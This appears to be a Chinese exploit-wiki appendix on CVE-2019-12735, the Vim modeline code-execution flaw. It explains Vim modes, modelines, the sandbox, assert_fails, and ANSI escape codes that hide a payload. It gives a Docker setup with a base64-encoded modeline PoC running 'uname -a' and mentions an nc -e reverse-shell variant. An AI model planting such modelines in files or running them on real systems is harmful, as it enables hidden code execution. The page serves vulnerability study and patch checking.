<!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  
  <link rel="shortcut icon" href="../../img/favicon.ico">
  <title>Cve 2019 12735 附件 - expwiki</title>
  <link href='https://fonts.googleapis.com/css?family=Lato:400,700|Roboto+Slab:400,700|Inconsolata:400,700' rel='stylesheet' type='text/css'>

  <link rel="stylesheet" href="../../css/theme.css" type="text/css" />
  <link rel="stylesheet" href="../../css/theme_extra.css" type="text/css" />
  <link rel="stylesheet" href="../../css/highlight.css">
  
  <script>
    // Current page data
    var mkdocs_page_name = "Cve 2019 12735 \u9644\u4ef6";
    var mkdocs_page_input_path = "userspace/cve-2019-12735-\u9644\u4ef6.md";
    var mkdocs_page_url = "/userspace/cve-2019-12735-\u9644\u4ef6/";
  </script>
  
  <script src="../../js/jquery-2.1.1.min.js"></script>
  <script src="../../js/modernizr-2.8.3.min.js"></script>
  <script type="text/javascript" src="../../js/highlight.pack.js"></script> 
  
</head>

<body class="wy-body-for-nav" role="document">

  <div class="wy-grid-for-nav">

    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
      <div class="wy-side-nav-search">
        <a href="../.." class="icon icon-home"> expwiki</a>
        <div role="search">
  <form id ="rtd-search-form" class="wy-form" action="../../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" />
  </form>
</div>
      </div>

      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
	<ul class="current">
	  
          
            <li class="toctree-l1">
		
    <a class="" href="../..">Home</a>
	    </li>
          
            <li class="toctree-l1">
		
    <a class="" href="../../acknowledgements/">Acknowledgements</a>
	    </li>
          
            <li class="toctree-l1">
		
    <span class="caption-text">Kernel</span>
    <ul class="subnav">
                <li class="">
                    
    <a class="" href="../../kernel/cve-2018-18281-分析/">Cve 2018 18281 分析</a>
                </li>
                <li class="">
                    
    <a class="" href="../../kernel/cve-2018-18281-附件/">Cve 2018 18281 附件</a>
                </li>
                <li class="">
                    
    <a class="" href="../../kernel/cve-2019-13272-分析/">Cve 2019 13272 分析</a>
                </li>
                <li class="">
                    
    <a class="" href="../../kernel/cve-2019-13272-附件/">Cve 2019 13272 附件</a>
                </li>
    </ul>
	    </li>
          
            <li class="toctree-l1">
		
    <span class="caption-text">Userspace</span>
    <ul class="subnav">
                <li class="">
                    
    <a class="" href="../cve-2018-1000001-分析/">Cve 2018 1000001 分析</a>
                </li>
                <li class="">
                    
    <a class="" href="../cve-2018-1000001-附件/">Cve 2018 1000001 附件</a>
                </li>
                <li class="">
                    
    <a class="" href="../cve-2019-12735-分析/">Cve 2019 12735 分析</a>
                </li>
                <li class=" current">
                    
    <a class="current" href="./">Cve 2019 12735 附件</a>
    <ul class="subnav">
            
    <li class="toctree-l3"><a href="#vimcve-2019-12735">Vim漏洞分析附件(cve-2019-12735)</a></li>
    
        <ul>
        
            <li><a class="toctree-l4" href="#_1">背景知识</a></li>
        
            <li><a class="toctree-l4" href="#exp">exp修改说明</a></li>
        
            <li><a class="toctree-l4" href="#vim_2">Vim安装</a></li>
        
            <li><a class="toctree-l4" href="#_3">漏洞防护</a></li>
        
        </ul>
    

    </ul>
                </li>
                <li class="">
                    
    <a class="" href="../cve-2019-5736-分析/">Cve 2019 5736 分析</a>
                </li>
                <li class="">
                    
    <a class="" href="../cve-2019-5736-附件/">Cve 2019 5736 附件</a>
                </li>
    </ul>
	    </li>
          
        </ul>
      </div>
      &nbsp;
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
        <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
        <a href="../..">expwiki</a>
      </nav>

      
      <div class="wy-nav-content">
        <div class="rst-content">
          <div role="navigation" aria-label="breadcrumbs navigation">
  <ul class="wy-breadcrumbs">
    <li><a href="../..">Docs</a> &raquo;</li>
    
      
        
          <li>Userspace &raquo;</li>
        
      
    
    <li>Cve 2019 12735 附件</li>
    <li class="wy-breadcrumbs-aside">
      
    </li>
  </ul>
  <hr/>
</div>
          <div role="main">
            <div class="section">
              
                <h1 id="vimcve-2019-12735">Vim漏洞分析附件(cve-2019-12735)</h1>
<h3 id="_1">背景知识</h3>
<h4 id="vim">Vim的模式</h4>
<p><a href="http://vimdoc.sourceforge.net/htmldoc/intro.html#vim-modes-intro">参考：http://vimdoc.sourceforge.net/htmldoc/intro.html#vim-modes-intro</a>  </p>
<p><strong>Normal mode</strong></p>
<p>通过 $ vim file 打开文件后进入的模式</p>
<pre><code class="shell">$ vim hello.txt
Hello
~                                                                     
~                                                                      
~                                                                      ...
~                                                                               
&quot;hello.txt&quot; 1L, 6C

</code></pre>

<p>通过source!加载的脚本的内容，就是相当于在这个模式下输入的内容</p>
<p><strong>Command-line mode</strong></p>
<ul>
<li>
<p>在normal mode下输入<code>: ( and / ? )</code>进入Command-line mode</p>
</li>
<li>
<p>在Vim的Command-line模式下，可以执行Vim commands</p>
</li>
<li>其中，通过 <code>:!{shell cmd}</code> 可以执行shell命令</li>
</ul>
<pre><code class="shell"># http://vimdoc.sourceforge.net/htmldoc/various.html#:!
$ vim
:!uname -a

Linux ubuntu 4.4.0-112-generic #135-Ubuntu SMP Fri Jan 19 11:48:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux

Press ENTER or type command to continue

</code></pre>

<p><strong>Ex mode</strong></p>
<ul>
<li>
<p>通过<code>$ vim -e  file</code>进入该模式</p>
</li>
<li>
<p>也可以在Normal mode下输入Q进入该模式</p>
</li>
<li>这个模式的特点是可以连续执行Vim command，可以类比 python 的命令行模式</li>
<li>通过source加载的脚本的内容，就是相当于在这个模式下输入的内容</li>
</ul>
<p><strong>Insert mode</strong></p>
<ul>
<li>
<p>在Normal mode下输入i可以进入Insert mode, 这个模式相当于编辑模式，大部分操作和在记事本中一样。</p>
</li>
<li>
<p>另外还有 "I", "a", "A", "o", "O", "c", "C", "s" or S"也可以从Normal mode进入Insert mode.</p>
</li>
<li>
<p>具体模式转换见: <a href="http://vimdoc.sourceforge.net/htmldoc/intro.html#vim-modes-intro">http://vimdoc.sourceforge.net/htmldoc/intro.html#vim-modes-intro</a></p>
</li>
<li>
<p>其中"S"表示剪切当前行，并进入Insert mode</p>
</li>
</ul>
<pre><code class="shell"># :help S
# [&quot;x]S                   Delete [count] lines [into register x] and start
#                           insert.  Synonym for &quot;cc&quot; |linewise|.

# Demo演示
$ vim 1.vim
:let i = 1
:while i &lt; 10
:    let a = getline(i)
:    if empty(a)
:        break
:    endif
:    echo &quot;Line:&quot; i &quot;is&quot;  a
:    let i += 1
:endwhile
~                                                                      
...     
~                                                                               
&quot;1.vim&quot; 9L, 147C

S(shift+s)


:while i &lt; 10
:    let a = getline(i)
:    if empty(a)
:        break
:    endif
:    echo &quot;Line:&quot; i &quot;is&quot;  a
:    let i += 1
:endwhile
~                                                                      ...
~

-- INSERT --
&lt;ESC&gt;
p  (p是粘贴)
p


:let i = 1
:let i = 1
:while i &lt; 10
:    let a = getline(i)
:    if empty(a)
:        break
:    endif
:    echo &quot;Line:&quot; i &quot;is&quot;  a
:    let i += 1
:endwhile
~                                                                      ...


</code></pre>

<h4 id="vim-options">Vim options的概念</h4>
<p>Vim的options相当于编辑器的配置，通过command-line模式的:set命令手动配置，也可以通过脚本自动配置，自动配置的方法主要是通过Vim脚本(.vimrc, .exrc)或者modeline方式。</p>
<h4 id="vimmodeline">Vim的modeline功能</h4>
<ul>
<li>
<p>参考1: <a href="http://vimdoc.sourceforge.net/htmldoc/options.html#modeline">http://vimdoc.sourceforge.net/htmldoc/options.html#modeline</a></p>
</li>
<li>
<p>参考2: <a href="http://vimdoc.sourceforge.net/htmldoc/options.html#modeline">https://vim.fandom.com/wiki/Modeline_magic</a></p>
</li>
</ul>
<p>modeline用于在文本文件的首部或者尾部设置vim options, 让vim打开文件的时候自动加载并执行该配置</p>
<pre><code class="shell">
# modeline 有两种格式
# 第一种格式： [text]{white}{vi:|vim:|ex:}[white]{options}
#                           vi:noai:sw=3 ts=6 
# - text可以用来放置编程语言的注释(python的 # , C 的// )，是可选的
# - vi:之前一定要有空格
# - options用&quot;:&quot;或者空格分隔


# 第二种格式：    
#  [text]{white}{vi:|vim:|ex:}[white]se[t] {options}:[text]
#               /* vim: set ai tw=75: */ 
# - 首尾都可以用text主要是支持(C的这种注释 &quot;/**/&quot;)，首尾的text都是可选的
# - vim: 后面要有空格
# - 要有一个set(可以缩写成 se，后面跟空格)
# - options用空格分隔
# - 结尾要有冒号 : 

</code></pre>

<p>开启modeline</p>
<pre><code class="shell"># 编辑~/.vimrc
# 添加：
set modeline
set modelines=5

</code></pre>

<p>具体使用</p>
<pre><code class="shell"># 用Vim打开文本：
$ vim a.py
# python3
# coding=utf-8
import platform

def func1():
        for i in range(10):
                print(&quot;hello vim&quot;)
                print(platform.platform())
# cursor is here 

def main():
        func1()

main()


# 打开a.py后, 默认的tab长度是8个空格，不支持回车自动缩进
# 可以通过tabstop和autoindent两个选项来配置
:set tabstop=4
:set autoindent


# 效果如下：
# python3
# coding=utf-8
import platform

def func1():
    for i in range(10):
        print(&quot;hello vim&quot;)
        print(platform.platform())
        # cursor is here

def main():
    func1()

main()


# 但是下次打开后，又需要再配置一次
# 可以通过modeline来使这个配置每次打开a.py文件时都生效
# 在文件开头添加一行内容： # vim: set tabstop=4 autoindent: 
# 再次打开效果如下：

$ vim a.py
# vim: set tabstop=4 autoindent: 
# python3
# coding=utf-8
import platform


def func1():
    for i in range(10):
        print(&quot;hello vim&quot;)
        print(platform.platform())
        # cursor is here

def main():
    func1()

main()



</code></pre>

<p><code>For security reasons, only a subset of options is permitted in modelines, and if the option value contains an expression, it is executed in a sandbox</code><br />
为了安全原因，只有部分options可以在modeline中配置，如果option的值是一个表达式(比如配置foldexpr)，那么表达式会在vim的sandbox中执行</p>
<h4 id="vim_1">Vim表达式和脚本</h4>
<p>根据Vim Script语法编写Vim脚本，参考：</p>
<p><a href="https://github.com/name5566/vim-config/blob/master/vim_script.md">https://github.com/name5566/vim-config/blob/master/vim_script.md</a>
<a href="http://vimdoc.sourceforge.net/htmldoc/usr_41.html">http://vimdoc.sourceforge.net/htmldoc/usr_41.html</a>
<a href="http://vimdoc.sourceforge.net/htmldoc/eval.html">http://vimdoc.sourceforge.net/htmldoc/eval.html</a>
<a href="http://vimdoc.sourceforge.net/htmldoc/eval.html">http://vimdoc.sourceforge.net/htmldoc/eval.html#functions</a></p>
<pre><code class="shell"># 创建一个Vim脚本1.vim
$ vim 1.vim


# 按照Vim Script语法编辑脚本
:let i = 1
:while i &lt; 10
:    let a = getline(i)
:    if empty(a) 
:        break
:    endif
:    echo &quot;Line:&quot; i &quot;is&quot;  a
:    let i += 1
:endwhile


# 保存
:w


# 用source指令加载自己并执行
:source % 
# or
:source 1.vim


# 执行结果：
Line: 1 is :let i = 1
Line: 2 is :while i &lt; 10
Line: 3 is :    let a = getline(i)
Line: 4 is :    if empty(a)
Line: 5 is :        break
Line: 6 is :    endif
Line: 7 is :    echo &quot;Line:&quot; i &quot;is&quot;  a
Line: 8 is :    let i += 1
Line: 9 is :endwhile
Press ENTER or type command to continue



# 在编辑其他文件的时候加载并执行一个Vim脚本
$ vim a.txt
Hello
Vim
Goodbye!
~         
:source 1.vim


Line: 1 is Hello
Line: 2 is Vim
Line: 3 is Goodbye!
Press ENTER or type command to continue


</code></pre>

<h4 id="source">source命令</h4>
<p>source命令用于从Vim脚本文件中读取Vim指令并执行，参考：<a href="http://vimdoc.sourceforge.net/htmldoc/repeat.html#using-scripts">http://vimdoc.sourceforge.net/htmldoc/repeat.html#using-scripts</a></p>
<pre><code class="shell">:help source

:so[urce] {file}        
  Read Ex commands from {file}.  
  These are commands that start with a &quot;:&quot;.


:so[urce]! {file}       
  Read Vim commands from {file}.  
  These are commands that are executed from Normal mode, 
  like you type them.


</code></pre>

<p>source和source!的区别在于：</p>
<ul>
<li>source是从文件读取 Ex commands, 也就是说文件的内容必须是 :cmd 的形式</li>
<li>source!是从文件读取 Normal mode下执行的vim commands, 也就是说文件中的<code>&lt;ESC&gt; i /</code> 字符这些都会当成Normal mode下的用户输入(like you type them)</li>
</ul>
<pre><code class="shell"># 创建一个vim脚本，写入内容iHello,World后保存
$ vim 5.vim
iHello,World

:wq

# 用source! 加载并执行脚本
$ vim 
:source! 5.vim

# 效果如下，打开后直接进入了Insert mode
Hello,World

~                                                                      
~                                                                      
...                                                                    
~                                                                       
~                                                                                                        
-- INSERT --


# 而用source加载则会报错
$ vim 
:source 5.vim


Error detected while processing 5.vim:
line    1:
E492: Not an editor command: iHello,World
Press ENTER or type command to continue


</code></pre>

<h4 id="vimshell">vim执行shell命令</h4>
<p>通过在command-line mode下，使用 !{cmd}来执行shell命令</p>
<pre><code class="shell">$ vim
:!uname -a

Linux ubuntu 4.4.0-112-generic #135-Ubuntu SMP Fri Jan 19 11:48:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux

Press ENTER or type command to continue


</code></pre>

<pre><code class="shell"># 一个可以执行shell命令的vim脚本
$ vim a.vim
&lt;i&gt;
:!uname -a
~
~
&lt;ESC&gt;
:source %

... Darwin Kernel Version 18.2.0: Thu Dec 20 20:46:53 PST 2018; root:xnu-4903.241.1~1/RELEASE_X86_64 x86_64

Press ENTER or type command to continue

# 特殊的函数execute
# $ vim
# :help execute()
#  execute({command} [, {silent}])                                 *execute()*
#                 Execute an Ex command or commands and return the output as a
#                 string. 
#                 {command} can be a string or a List.  In case of a List the
#                 lines are executed one by one. 
# ...

#                 The optional {silent} argument can have these values:
#                         &quot;&quot;              no `:silent` used
#                         &quot;silent&quot;        `:silent` used
#                         &quot;silent!&quot;       `:silent!` used
#                               The default is &quot;silent&quot;.  
#                               Note that with &quot;silent!&quot;, unlike `:redir`, error messages are dropped
# ...


$ vim b.vim
: call execute(&quot;source a.vim&quot;, &quot;&quot;)


... Darwin Kernel Version 18.2.0: Thu Dec 20 20:46:53 PST 2018; root:xnu-4903.241.1~1/RELEASE_X86_64 x86_64


Press ENTER or type command to continue


# execute函数在ubuntu上安装的Vim中没有，但是还有另一个可以执行shell命令：assert_fails()
# $ vim
# :help assert_fails
# 
# assert_fails({cmd} [, {error}])                                 *assert_fails()*
#                 Run {cmd} and add an error message to |v:errors| if it does
#                 NOT produce an error.
#                 When {error} is given it must match in |v:errmsg|.
$ vim b.vim
: call assert_fails(&quot;source a.vim&quot;)


... Darwin Kernel Version 18.2.0: Thu Dec 20 20:46:53 PST 2018; root:xnu-4903.241.1~1/RELEASE_X86_64 x86_64


Press ENTER or type command to continue


</code></pre>

<h4 id="silent">silent命令</h4>
<pre><code class="shell"># :help silent
#                              *:sil* *:silent* *:silent!*
# :sil[ent][!] {command}  
#    Execute {command} silently.  
#    Normal messages will not
#    be given or added to the message history.
#    When [!] is added, error messages will also be
#    skipped, and commands and mappings will not be aborted
#    when an error is detected.



# 1. 编写一个文件，不使用silent，保存后会在底部出现回显信息
vim 1.txt
i
something 
~                                                                      ...     
~       
&lt;ESC&gt;
:w                                                                   
&quot;a.vim&quot; 1L, 11C written

# 2. 使用silent，w命令的回显信息就消失了
vim 1.txt
i
somenthing
~                                                                       ...   
~                                                                               
:silent! w

# 3. silent! 可以用来去除错误信息
vim 1.txt
i
something
&lt;ESC&gt;
:w
:file | silent! Anycommand or anytext'\' \; &quot;

something
~                                                                      ...
~                                                                                                                                           
&quot;1.vim&quot; line 1 of 1 --100%-- col 9


</code></pre>

<h4 id="redraw">redraw命令</h4>
<pre><code class="shell"># :help redraw!
#                                             *:redr*  *:redraw*
# :redr[aw][!]            
#  Redraw the screen right now.  
#  When ! is included it is cleared first.
#                         ... 
# 立刻刷新屏幕，如果设置了!则先清除屏幕内容
# 每条命了执行完，底部会留下历史记录， redraw!会清除掉记录

# 屏幕会清空
vim 1.txt
i
somenthing
~                                                                       ...   
~                                                                               
:silent! w
:redraw!

something
~                                                                       ...
~                                                                            

</code></pre>

<h4 id="file">file命令</h4>
<pre><code class="shell"># 输入当前文件信息
vim 1.txt
i
something
&lt;ESC&gt;
:w
:file
something
~                                                                      ...
~                                                                                                                                           
&quot;1.vim&quot; line 1 of 1 --100%-- col 9



</code></pre>

<h4 id="system">system函数</h4>
<pre><code class="shell">system({expr} [, {input}])                              *system()* *E677*
Get the output of the shell command {expr} as a string.  
... 

$ vim
:let a = system('pwd')
:echo a

~                                                                      
/home/invincible/Desktop/test/vim_test

Press ENTER or type command to continue


</code></pre>

<h4 id="assert_fails">assert_fails函数</h4>
<p>执行一个vim command, 如果没有出错，则将command的执行信息保存到v:errors全局变量中</p>
<pre><code class="shell">:help assert_fails

assert_fails({cmd} [, {error}])                                
  Run {cmd} and add an error message to |v:errors| 
  if it does NOT produce an error.
  When {error} is given it must match in |v:errmsg|.

</code></pre>

<pre><code class="shell">$ vim
:call assert_fails(&quot;echo 'hello'&quot;)

~
...
~
hello

:echo v:errors
['command did not fail: echo ''hello''']

</code></pre>

<p>编写一个可以执行shell命令的vim脚本</p>
<pre><code class="shell">
$ vim a.vim
&lt;i&gt;
:!uname -a
~
~
&lt;ESC&gt;
:wq

# 用assert_faild执行vim的source指令，加载vim脚本a.vim
$ vim
:call assert_fails(&quot;source a.vim&quot;)

Linux ubuntu 4.4.0-112-generic #135-Ubuntu SMP Fri Jan 19 11:48:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux

Press ENTER or type command to continue

:echo v:errormsg
['command did not fail: source a.vim']

</code></pre>

<h4 id="vimfolding">Vim的folding功能</h4>
<ul>
<li>
<p>vim的folding功能用于对文本中的文本块（比如一个函数，一段注释）折叠和展开，可以类比为图形化编辑器编辑区侧栏的(+/-)。</p>
</li>
<li>
<p>foldmethod选项是用来配置Vim的代码折叠功能的，Vim给出了manual, indent, expr, syntax, diff, marker这几种代码折叠的方式，下面👇是indent方式的效果：</p>
</li>
</ul>
<pre><code class="shell"># 文本如下
$ vim a.py

# python3
# coding=utf-8
import platform

def func1():
        for i in range(10):
                print(&quot;hello vim&quot;)
                print(platform.platform())

def main():
        func1()

main()


# 1. 设置foldmethod选项
:set foldenable
:set foldmethod=indent

# 效果如下
# python3
# coding=utf-8
import platform

def func1():
+--  3 lines: for i in range(10):-------------------------------------

def main():
        func1()

main()


</code></pre>

<p>如果不满足于给定的几种方式，可以将foldmethod设置为expr来自定义代码块的特征</p>
<pre><code class="shell"># 文本如下
$ vim a.py

# python3
# coding=utf-8
import platform

def func1():
        for i in range(10):
                print(&quot;hello vim&quot;)
                print(platform.platform())

def main():
        func1()


main()

:set foldenable
:set foldmethod=expr
:set foldexpr=getline(v:lnum)[0]==\&quot;#\&quot;
# foldexpr用于设置文本满足的条件，满足条件的文本块会被折叠
# 该配置的意思是通过Vim的getline函数，判断每一行文本的第一个字符是否为&quot;#&quot;，将满足条件的相邻的行视为一个文本块，并将其折叠
# 效果如下: 

+--  2 lines: # python3-----------------------------------------------
import platform

def func1():
        for i in range(10):
                print(&quot;hello vim&quot;)
                print(platform.platform())

def main():
        func1()

main()



</code></pre>

<h4 id="vimsandbox">vim的sandbox概念</h4>
<pre><code class="shell">11. The sandbox                 *eval-sandbox* *sandbox* *E48*


The 'foldexpr', 'formatexpr', 'includeexpr', 'indentexpr', 'statusline' and
'foldtext' options may be evaluated in a sandbox. 


This gives some safety for when these options are set from a modeline.  


These items are not allowed in the sandbox:
    - changing the buffer text
    - defining or changing mapping, autocommands, functions, user commands
    - setting certain options (see |option-summary|)
    - setting certain v: variables (see |v:var|)  *E794*
    - executing a shell command
    - reading or writing a file
    - jumping to another buffer or editing a file
    - executing Python, Perl, etc. commands


</code></pre>

<h4 id="ansi-escape-codes">ANSI escape codes</h4>
<p>参考：</p>
<p><a href="https://www.gnu.org/software/screen/manual/html_node/Control-Sequences.html">https://www.gnu.org/software/screen/manual/html_node/Control-Sequences.html</a><br />
<a href="https://notes.burke.libbey.me/ansi-escape-codes/">https://notes.burke.libbey.me/ansi-escape-codes/</a><br />
<a href="https://learnku.com/articles/26231">https://learnku.com/articles/26231</a>  </p>
<h5 id="x1b1g">\x1b[1G</h5>
<p>\x1b[1G 光标移动到当前行的第Pn个位置</p>
<pre><code class="shell"># ESC [ Pn G                      Cursor horizontal position
# $ echo -e &quot;Hello\x1b[1GA&quot; &gt; a.txt
# $ cat a.txt
# Aello
# $ echo -e &quot;Hello\x1b[2GA&quot; &gt; a.txt
# $ cat a.txt
# HAllo
# $ echo -e &quot;Hello\x1b[3GA&quot; &gt; a.txt
# $ cat a.txt
# HeAlo

</code></pre>

<h5 id="x1bd">\x1b[D</h5>
<p>\x1b[D 光标左移1个位置</p>
<pre><code class="shell"># ESC [ Pn D                      Cursor Left
# 光标左移Pn个位置
# $ echo -e &quot;Hello\x1b[D&quot; &gt; a.txt
# $ cat a.txt
# Hello
# $ echo -e &quot;Hello\x1b[D\x1b[D\x1b[DAAA&quot; &gt; a.txt
# $ cat a.txt
# HeAAA
# $ echo -e &quot;Hello\x1b[5DAAA&quot; &gt; a.txt
# $ cat a.txt
# AAAlo

</code></pre>

<h5 id="x1bk">\x1b[K</h5>
<p>\x1b[K 清除光标到当前位置的内容</p>
<pre><code class="shell"># *  ESC [ K           erase to end of line (inclusive)
# 清除光标到当前位置的内容(不会改变文本)，可以配合\x1b[G使用
$ echo -e &quot;AAAA\x1b[1G\x1b[KBBBB&quot; &gt; a.txt
$ cat  a.txt
BBBB
$ echo -e &quot;ABCD\x1b[2G\x1b[KEEEE&quot; &gt; a.txt
$ cat  a.txt
AEEEE
$ echo -e &quot;ABCD\x1b[3G\x1b[KEEEE&quot; &gt; a.txt
$ cat a.txt 
ABEEEE
$ echo -e &quot;ABCD\x1b[KEEEE&quot; &gt; a.txt
$ cat a.txt 
ABCDEEEE

</code></pre>

<h5 id="x1b2k">\x1b[2K</h5>
<p><img alt="cve-2019-12735-01_p1.png" src="../img/cve-2019-12735-01_p1.png" />      </p>
<h5 id="x1b7l">\x1b[?7l</h5>
<ul>
<li>ESC [ ? 7 l       auto wrap off  </li>
<li>
<p>\x1b[?7l 关闭自动换行 (l -&gt; low)</p>
</li>
<li>
<p>\x1b[?7h 开启自动换行 (h -&gt; high)</p>
</li>
<li>这个命令的功能是控制Terminal的显示功能，默认情况下，如果文本长度超过Terminal的显示长度，则会自动换行，如果关闭了自动换行，则会全部显示在一行，超出的部分被"截断"</li>
</ul>
<p>​<img alt="cve-2019-12735-01_p2.png.png" src="../img/cve-2019-12735-01_p2.png" />      </p>
<p>\x1b[?7l 和 \x1b[1G 配合使用的效果：</p>
<p>使用前 ：   <br />
<img alt="cve-2019-12735-01_p3.png" src="../img/cve-2019-12735-01_p3.png" />               </p>
<p>使用后：</p>
<p><img alt="cve-2019-12735-01_p4.png" src="../img/cve-2019-12735-01_p4.png" />      </p>
<p>\x1b[?7l 和 \x1b[1G + \x1b[K 配合使用的效果：      <br />
<img alt="cve-2019-12735-01_p5.png" src="../img/cve-2019-12735-01_p5.png" />      </p>
<h5 id="x16">\x16</h5>
<p>参考:</p>
<p><a href="http://defindit.com/ascii.html">http://defindit.com/ascii.html</a><br />
<a href="https://zh.wikipedia.org/wiki/%E6%8E%A7%E5%88%B6%E5%AD%97%E7%AC%A6">https://zh.wikipedia.org/wiki/%E6%8E%A7%E5%88%B6%E5%AD%97%E7%AC%A6</a>  </p>
<p>这是一个ascii码的控制字符，代表 ctrl+v，它的功能可以理解为：让下一个输入识别为普通字符</p>
<pre><code class="shell">$ cat a.py
a = input(&quot;&gt; &quot;)
print(ord(a[0]))

$ python3 a.py
# 想直接输入ctrl+c, 但程序退出，被识别成了中断信号
&gt; ^CTraceback (most recent call last):
  File &quot;a.py&quot;, line 1, in &lt;module&gt;
    a = input(&quot;&gt; &quot;)
KeyboardInterrupt

$ python3 a.py
# 依次按下ctrl+v和ctrl+c, 就顺利打印出了ctrl+c的ascii码
&gt; ^C
3

</code></pre>

<p>为什么Exp中需要\x16控制字符</p>
<pre><code class="shell">echo -e &quot;iHello\x1b[D&quot; &gt; a.vim
$ vim 
:source! a.vim

Hello
~                                                                      ...   
~                                                                               
E388: Couldn't find definition

这个报错可以手动输入下面的指令产生：
$ vim
i
Hello
&lt;ESC&gt;
[
shift+d

# 如果加上\x16则\x1b不会被解析成&lt;ESC&gt;按键，而是输入字符
echo -e &quot;iHello\x16\x1b[D&quot; &gt; a.vim

Hello^[[D
~                                                                      ...
~

-- INSERT --




</code></pre>

<h3 id="exp">exp修改说明</h3>
<ul>
<li>nc -&gt; nc.traditional </li>
</ul>
<p>Ubuntu上的nc不包含-e选项，解决办法是安装nc.traditional来替代nc命令</p>
<ul>
<li>\x1b[K -&gt; \x1b[2K 和 \x1b[D -&gt; \x1b[2D 和空格是用于清除不可见字符\x16和引号</li>
</ul>
<p>修改前: </p>
<p><img alt="cve-2019-12735-01_p6.png" src="../img/cve-2019-12735-01_p6.png" /></p>
<p><img alt="cve-2019-12735-01_p7.png" src="../img/cve-2019-12735-01_p7.png" />       </p>
<p>修改后:      <br />
<img alt="cve-2019-12735-01_p8.png" src="../img/cve-2019-12735-01_p8.png" />               </p>
<p><img alt="cve-2019-12735-01_p9.png" src="../img/cve-2019-12735-01_p9.png" />       </p>
<h3 id="vim_2">Vim安装</h3>
<h4 id="apt">apt自动安装</h4>
<pre><code class="shell">apt-get install vim-runtime=2:7.4.1689-3ubuntu1
apt-get install vim-common=2:7.4.1689-3ubuntu1
apt-get install vim=2:7.4.1689-3ubuntu1

</code></pre>

<h4 id="deb">使用deb包安装</h4>
<p>链接:<a href="https://pan.baidu.com/s/1rn0RqwWn0tpgk9PY0v00Jw">https://pan.baidu.com/s/1rn0RqwWn0tpgk9PY0v00Jw</a> 密码:m0qc</p>
<pre><code class="shell">sudo dpkg -i vim_2%3a7.4.1689-3ubuntu1_amd64.deb
</code></pre>

<h4 id="_2">下载源码手动编译</h4>
<pre><code class="shell"># 下载源码，编译生成符号
# 参考：https://www.unix.com/programming/156665-compile-debug-vim-source-code.html
$ mkdir ~/MyVim
$ cd ~/MyVim
$ sudo apt-get install libncurses5-dev libncursesw5-dev
$ apt-get source vim=2:7.4.1689-3ubuntu1
$ cd src
$ cp Makefile Makefile.orig
$ vim Makefile
$ diff Makefile Makefile.orig
540c540
&lt; CFLAGS = -g
---
&gt; #CFLAGS = -g
908c908
&lt; prefix = ~/MyVim
---
&gt; #prefix = $(HOME)
1852c1852
&lt; #    $(STRIP) $(DEST_BIN)/$(VIMTARGET)
---
&gt;     $(STRIP) $(DEST_BIN)/$(VIMTARGET)
$ cd ..
$ make &amp;&amp; make install
$ cd bin
$ gdb ./vim

</code></pre>

<h4 id="docker">Docker复现环境搭建</h4>
<p>可以通过Docker快速搭建poc复现环境</p>
<pre><code class="shell">$ ls
Dockerfile
$ cat Dockerfile
From ubuntu:16.04
RUN set -e -x ;\
    apt update ;\
    apt-get install -y vim-runtime=2:7.4.1689-3ubuntu1 ;\
    apt-get install -y vim-common=2:7.4.1689-3ubuntu1 ;\
    apt-get install -y vim=2:7.4.1689-3ubuntu1 ;\
    echo &quot;OiF1bmFtZSAtYXx8IiB2aTpmZW46ZmRtPWV4cHI6ZmRlPWFzc2VydF9mYWlscygic291cmNlXCFcIFwlIik6ZmRsPTA6ZmR0PSIK&quot; | base64 --decode &gt; /root/poc.txt 

$ sudo docker build -t vim-cve-2019-12735 .
$ sudo docker run -it vim-cve-2019-12735 /bin/bash
echo -e &quot;set modeline\nset modelines=5&quot; &gt; ~/.vimrc 
cd root
vim poc.txt


</code></pre>

<h3 id="_3">漏洞防护</h3>
<h4 id="package">package版本检查</h4>
<ul>
<li>查看可安装的Vim版本</li>
</ul>
<pre><code class="shell"># 查看可安装的Vim版本
$ apt-cache policy vim
vim:
  Installed: (none)
  Candidate: 2:7.4.1689-3ubuntu1.4
  Version table:
     2:7.4.1689-3ubuntu1.4 500
        500 https://mirrors.tuna.tsinghua.edu.cn/ubuntu xenial-updates/main amd64 Packages
        500 https://mirrors.tuna.tsinghua.edu.cn/ubuntu xenial-security/main amd64 Packages
     2:7.4.1689-3ubuntu1 500
        500 https://mirrors.tuna.tsinghua.edu.cn/ubuntu xenial/main amd64 Packages

# 从Vim包的changelog中获取修复漏洞的版本号 2:7.4.1689-3ubuntu1.3
$ cat vim_changelog.txt |grep CVE-2019-12735 -C 10
...
vim (2:7.4.1689-3ubuntu1.3) xenial-security; urgency=medium

  * SECURITY UPDATE: Arbitrary code execution
    - debian/patches/CVE-2019-12735.patch: disallow
      sourcing a file in the sandbox in src/getchar.c
    - CVE-2019-12735
  * SECURITY UPDATE: Buffer overflow
    - debian/patches/CVE-2017-5953.patch: check for an
      invalid length in order to avoid a overflow in
      src/spell.c.
    - CVE-2017-5953


 -- Leonidas S. Barbosa &lt;leo.barbosa@canonical.com&gt;  Fri, 07 Jun 2019 12:35:43 -0300


</code></pre>

<ul>
<li>安装存在漏洞的版本</li>
</ul>
<pre><code class="shell">
$ sudo apt install vim-common=2:7.4.1689-3ubuntu1
$ sudo apt install vim-runtime=2:7.4.1689-3ubuntu1
$ sudo apt install vim=2:7.4.1689-3ubuntu1

# 通过apt-cache 查看已安装的版本 &lt; 2:7.4.1689-3ubuntu1.3
$ apt-cache policy vim:
  Installed: 2:7.4.1689-3ubuntu1
  Candidate: 2:7.4.1689-3ubuntu1.4
  ...

# 配置vimrc开启modeline功能
vim ~/.vimrc
i
set modeline
set modelines=5
&lt;ESC&gt;
:w

# 测试效果
